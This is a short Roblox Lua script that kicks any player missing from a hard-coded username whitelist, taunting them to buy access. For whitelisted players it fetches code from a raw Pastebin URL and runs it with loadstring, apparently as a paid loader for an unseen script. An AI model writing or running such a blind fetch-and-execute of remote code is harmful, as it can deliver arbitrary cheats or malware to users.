local player = game.Players.LocalPlayer

local WhitelistedUsernames = {
    "zeroiscute",
    "zerosigma",
    "trezzn025",
    "cutezero",
    -- hier weitere hinzufügen
}

local isWhitelisted = table.find(WhitelistedUsernames, player.Name) 
                   or table.find(WhitelistedUsernames, player.DisplayName)

if not isWhitelisted then
    task.wait(0.5)
    player:Kick("Not whitelisted | Go Buy it brokie")
    return -- verhindert dass der Code weiterläuft
end

print("Access granted")
loadstring(game:HttpGet("https://pastebin.com/raw/Gr1ZtEiy"))()
